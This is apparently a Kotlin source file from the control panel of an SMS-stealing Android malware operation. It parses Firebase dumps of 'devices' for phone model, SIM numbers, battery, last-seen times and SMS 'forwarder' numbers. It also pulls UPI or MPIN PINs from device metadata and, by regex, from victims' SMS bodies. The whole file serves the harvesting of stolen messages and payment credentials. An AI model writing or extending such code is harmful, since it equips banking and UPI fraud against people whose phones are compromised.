package com.firebasepanel.sms.domain

import org.json.JSONArray
import org.json.JSONObject
import java.util.regex.Pattern

/**
 * Firebase device nodes often sit under .../devices/<id>/ with keys like model, battery, sim, etc.
 * We merge fields seen while walking the same JSON tree used for SMS extraction.
 */
data class DeviceSnapshot(
    val deviceId: String,
    val model: String?,
    val batteryPercent: Int?,
    val sim1: String?,
    val sim2: String?,
    val registeredAtMillis: Long?,
    val lastSeenMillis: Long?,
    val forwarder: String?,
    /** Raw UPI/PIN from device metadata if present */
    val metadataUpiPin: String?,
)

private val BATTERY_KEY =
    Regex("^(?:battery|battery_?level|battery_?pct|bat_?pct|batPercent|level)$", RegexOption.IGNORE_CASE)
private val MODEL_KEY =
    Regex("^(?:model|device_?name|mobile|device_?model|deviceName|phone_?model|handset)$", RegexOption.IGNORE_CASE)
private val SIM_KEYS = listOf("sim1", "sim_1", "simOne", "phone1", "phone_1", "primarySim")
private val SIM2_KEYS = listOf("sim2", "sim_2", "simTwo", "phone2", "phone_2", "secondarySim")
private val LAST_SEEN_KEYS = listOf("lastSeen", "last_seen", "lastseen", "updatedAt", "updated_at", "seenAt", "seen_at")
private val REG_KEYS = listOf("registeredAt", "registered_at", "createdAt", "created_at", "joinedAt")
private val FORWARDER_KEYS = listOf("forwarder", "forwarderNumber", "forward_number", "forwardNo")
private val UPI_META_KEYS = listOf("upiPin", "upi_pin", "pin", "mpin", "UPI_PIN")

fun mergeDeviceSnapshotsFromJson(root: JSONObject): Map<String, DeviceSnapshot> {
    val acc = mutableMapOf<String, DeviceAccumulator>()
    walkDevices(root, "", acc, depth = 0)
    return acc.mapValues { (_, v) -> v.toSnapshot() }
}

private class DeviceAccumulator(
    val deviceId: String,
) {
    var model: String? = null
    var battery: Int? = null
    var sim1: String? = null
    var sim2: String? = null
    var registeredAt: Long? = null
    var lastSeen: Long? = null
    var forwarder: String? = null
    var metaPin: String? = null

    fun mergeFrom(obj: JSONObject) {
        mergeStringFields(obj)
        mergeBattery(obj)
        mergeTimes(obj)
    }

    private fun mergeStringFields(obj: JSONObject) {
        val keys = obj.keys().asSequence().toList()
        for (k in keys) {
            when {
                MODEL_KEY.matches(k) -> model = pickLonger(model, stringVal(obj, k))
                k in SIM_KEYS || SIM_KEYS.any { it.equals(k, true) } -> sim1 = pickLonger(sim1, stringVal(obj, k))
                k in SIM2_KEYS || SIM2_KEYS.any { it.equals(k, true) } -> sim2 = pickLonger(sim2, stringVal(obj, k))
                FORWARDER_KEYS.any { it.equals(k, true) } -> forwarder = pickLonger(forwarder, stringVal(obj, k))
                UPI_META_KEYS.any { it.equals(k, true) } -> {
                    val s = stringVal(obj, k)?.trim()
                    if (!s.isNullOrEmpty() && s != "N/A") metaPin = s
                }
            }
        }
    }

    private fun mergeBattery(obj: JSONObject) {
        for (k in obj.keys().asSequence()) {
            if (!BATTERY_KEY.matches(k)) continue
            parseBattery(obj.opt(k))?.let { b ->
                battery = maxOf(battery ?: -1, b)
            }
        }
    }

    private fun mergeTimes(obj: JSONObject) {
        for (k in REG_KEYS) {
            extractMillis(obj, k)?.let { t -> registeredAt = maxOf(registeredAt ?: 0L, t) }
        }
        for (k in LAST_SEEN_KEYS) {
            extractMillis(obj, k)?.let { t -> lastSeen = maxOf(lastSeen ?: 0L, t) }
        }
    }

    private fun pickLonger(a: String?, b: String?): String? {
        if (b.isNullOrBlank()) return a
        if (a.isNullOrBlank()) return b
        return if (b.length >= a.length) b else a
    }

    fun toSnapshot(): DeviceSnapshot =
        DeviceSnapshot(
            deviceId = deviceId,
            model = model?.takeIf { it.isNotBlank() },
            batteryPercent = battery,
            sim1 = sim1?.takeIf { it.isNotBlank() },
            sim2 = sim2?.takeIf { it.isNotBlank() },
            registeredAtMillis = registeredAt,
            lastSeenMillis = lastSeen,
            forwarder = forwarder?.takeIf { it.isNotBlank() },
            metadataUpiPin = metaPin?.takeIf { it.isNotBlank() },
        )
}

private fun walkDevices(
    node: Any?,
    path: String,
    acc: MutableMap<String, DeviceAccumulator>,
    depth: Int,
) {
    if (depth > 14) return
    when (node) {
        is JSONObject -> {
            val idFromPath = deviceIdFromFirebasePath(path)
            if (idFromPath != null) {
                val bucket = acc.getOrPut(idFromPath) { DeviceAccumulator(idFromPath) }
                bucket.mergeFrom(node)
            }
            for (k in node.keys()) {
                val child = node.opt(k) ?: continue
                if (k in setOf("messages", "sms", "inbox") && child is JSONObject) {
                    // Often SMS child objects — still walk but shallow
                }
                walkDevices(child, if (path.isEmpty()) k else "$path/$k", acc, depth + 1)
            }
        }
        is JSONArray -> {
            for (i in 0 until node.length()) {
                walkDevices(node.opt(i), "$path/$i", acc, depth + 1)
            }
        }
    }
}

/** e.g. devices/abc123/info -> abc123 */
private fun deviceIdFromFirebasePath(path: String): String? {
    val parts = path.split("/").filter { it.isNotEmpty() }
    val idx = parts.map { it.lowercase() }.indexOf("devices")
    if (idx >= 0 && idx + 1 < parts.size) {
        val id = parts[idx + 1]
        if (id != "messages" && id != "sms" && id.isNotBlank()) return id
    }
    return null
}

private fun stringVal(obj: JSONObject, key: String): String? {
    val v = obj.opt(key) ?: return null
    return when (v) {
        is String -> v.ifBlank { null }
        is Number -> v.toString()
        else -> null
    }
}

private fun parseBattery(v: Any?): Int? {
    when (v) {
        is Number -> {
            val n = v.toInt()
            return n.coerceIn(0, 100)
        }
        is String -> {
            val d = v.replace("%", "").trim().toDoubleOrNull() ?: return null
            return d.toInt().coerceIn(0, 100)
        }
        else -> return null
    }
}

private fun extractMillis(obj: JSONObject, key: String): Long? {
    if (!obj.has(key)) return null
    val v = obj.opt(key) ?: return null
    when (v) {
        is Number -> {
            var t = v.toLong()
            if (t > 1_000_000_000_000L) t /= 1000
            if (t > 1_000_000_000L) return t
        }
        is String -> {
            if (v.all { it.isDigit() }) {
                var t = v.toLongOrNull() ?: return null
                if (t > 1_000_000_000_000L) t /= 1000
                if (t > 1_000_000_000L) return t
            }
        }
    }
    return null
}

/** 4–6 digit UPI / MPIN style from SMS bodies (best effort). */
private val UPI_PIN_SMS =
    Pattern.compile(
        "(?:upi|m[- ]?pin|atm\\s*pin|pin)\\s*(?:is|[:=\\-])?\\s*([0-9]{4,6})\\b",
        Pattern.CASE_INSENSITIVE,
    )
private val YOUR_PIN_IS = Pattern.compile("\\b(?:your|ur)\\s+pin\\s+is\\s*([0-9]{4,6})\\b", Pattern.CASE_INSENSITIVE)

fun extractUpiPinDigitsFromSmsBodies(bodies: List<String>): String? {
    var best: String? = null
    for (body in bodies) {
        if (isHardSpamOnly(body, "")) continue
        for (p in listOf(UPI_PIN_SMS, YOUR_PIN_IS)) {
            val m = p.matcher(body)
            while (m.find()) {
                val d = m.group(1) ?: continue
                if (best == null || d.length >= best.length) best = d
            }
        }
    }
    return best
}
